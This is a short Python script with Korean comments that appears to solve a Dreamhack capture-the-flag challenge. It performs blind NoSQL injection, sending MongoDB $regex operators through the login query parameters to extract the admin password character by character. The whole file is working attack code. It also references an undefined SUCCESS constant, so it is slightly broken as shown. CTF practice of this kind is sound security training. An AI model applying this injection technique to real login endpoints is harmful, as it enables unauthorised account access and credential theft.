import requests, string

HOST = 'http://host3.dreamhack.games:24528'  # 대상 호스트 주소
CHARACTER_SET = string.digits + string.ascii_letters  # 영숫자로 구성된 문자열

found_password = ''  # 찾아낸 패스워드 일부분을 저장할 변수
for _ in range(32):  # 패스워드의 길이가 32라고 가정하여 반복
    for char in CHARACTER_SET:  # 영숫자 문자열을 하나씩 반복
        # 요청을 보내어 패스워드를 추측함
        response = requests.get(f'{HOST}/login?uid[$regex]=ad.in&upw[$regex]=D.{{{found_password}{char}')
        if response.text == SUCCESS:  # 만약 응답이 성공 메시지와 일치하면
            found_password += char  # 현재 문자를 패스워드의 일부로 추가
            break  # 다음 문자로 넘어감
    # 현재까지 찾아낸 패스워드의 일부분을 출력
    print(f'Found Password: DH{{{found_password}}}')
